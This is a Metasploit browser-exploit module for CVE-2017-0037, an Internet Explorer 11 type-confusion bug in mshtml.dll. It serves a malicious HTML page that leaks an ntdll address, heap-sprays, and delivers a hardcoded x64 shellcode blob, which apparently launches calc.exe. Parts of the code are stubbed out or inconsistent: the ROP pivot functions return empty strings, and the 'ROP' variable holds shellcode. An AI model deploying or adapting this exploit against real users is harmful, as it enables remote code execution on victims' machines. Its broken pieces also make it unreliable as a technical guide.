##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "CVE-2017-0037",
            'Description'    => %q{
              This module exploits type confusion vulnerability (CVE-2017-0037)
              present in the Layout::MultiColumnBoxBuilder::HandleColumnBreakOnColumnSpanningElement function in mshtml.dll.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Google Project Zero',          # Original RE research and exploitation
                'Hyeonhak Kim'            # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'IE11 on Windows 7', { } ],
                [ 'IE 11.0.9600.18537 on Windows 7', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2017-0037' ]
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "July 2017",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/rv:(\d*.\d+)/).flatten[0] || ""
  
      cm_name = "IE #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if ((!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def pivotrop(t)
      pivotrop = ""
      #pivot rop..
      pivotrop
    end

    def xchgrop(t)
      xchgrop = ""
      #xchg rop..
      xchgrop
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))

      rop_payload = get_payload(t);
      pivotrop = pivotrop(t);
      xchgrop = xchgrop(t);
      shellcode_payload = payload.encoded();

      html = <<-HTML
      <!DOCTYPE html>
      <html>
      <head>
          <style>
              .class1 { float: left; column-count: 5; }
              .class2 { column-span: all; columns: 1px; }
              table {border-spacing: 0px;}
          </style>
          <script>
       
          var ntdllBase = "";

           function infoleak() {
           
              var textarea = document.getElementById("textarea");
              var frame = document.createElement("iframe");
              textarea.appendChild(frame);
              frame.contentDocument.onreadystatechange = eventhandler;
              form.reset();  
          }
            
          function eventhandler() {
              document.getElementById("textarea").defaultValue = "foo";
              // Object replaced here
              // one of the side allocations of the audio element
              var j = document.createElement("canvas");
              ctx=j.getContext("2d");
              ctx.beginPath();
              ctx.moveTo(20,20);
              ctx.lineTo(20,100);
              ctx.lineTo(70,100);
              ctx.strokeStyle="red";
              ctx.stroke();              
          }
           
                  
          setTimeout(function() {
              var txt = document.getElementById("textarea");
              var il = txt.value.substring(2,4);
              var addr = parseInt(il.charCodeAt(1).toString(16) + il.charCodeAt(0).toString(16), 16);
              ntdllBase = addr - 0x000d7560;

              //alert("NTDLL base addr is: 0x" + ntdllBase.toString(16));
              spray();
              boom();
          }, 1000); 

          function writeu(base, offs) {
           
              var res = 0;
              if (base != 0) {  res = base + offs }
              else {  res = offs }
              res = res.toString(16);
              while (res.length < 8) res = "0"+res;
              return "%u"+res.substring(4,8)+"%u"+res.substring(0,4);
               
          }

          function spray()
          {
              var hso = document.createElement("div");

              var junk = unescape("%u0e0e%u0e0e");
              while(junk.length < 0x1000) junk += junk;

              //ntdll prefered base addr = 0x77ec0000
              
              //ROP chain built from NTDLL.DLL to disable DEP using VirtualProtect      
              var rop = #{rop_payload};

              //Shellcode

              var shellcode = #{shellcode_payload};

              //stack pivot
              var xchg = #{xchgrop}; //0x77eed801: xchg eax, esp ; retn
              //first stage ROP chain to do bigger stack pivot
              var pivot = #{pivotrop};

              var offset = 0x7c9; //magic number - offset into heap spray to reach addr 0x0e0e0e0e
              var data = junk.substring(0, 0x200) + rop + shellcode + junk.substring(0, offset - 0xd4 - 0x200 - rop.length - shellcode.length) + pivot + junk.substring(0, 0xd4 -pivot.length) + xchg;
              
              data += junk.substring(0, 0x800 - offset - xchg.length);
              while(data.length < 0x80000) data += data;
              for(var i = 0; i < 0x350; i++)
              {
                  var obj = document.createElement("button");
                  obj.title = data.substring(0, (0x7fb00-2)/2);
                  hso.appendChild(obj);
              }

          }
       
          function boom() {
              document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
              th1.align = "right";
          }
           
          </script>
      </head>
       
      <body onload=infoleak()>
           <form id="form">
              <textarea id="textarea" style="display:none" cols="80">aaaaaaaaaaaaa</textarea>
          </form>
          <table cellspacing="0">
              <tr class="class1">
              <th id="th1" colspan="0" width=2000000></th>
              <th class="class2" width=0><div class="class2"></div></th>
          </table>
      </body>
      </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
      end
  
      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
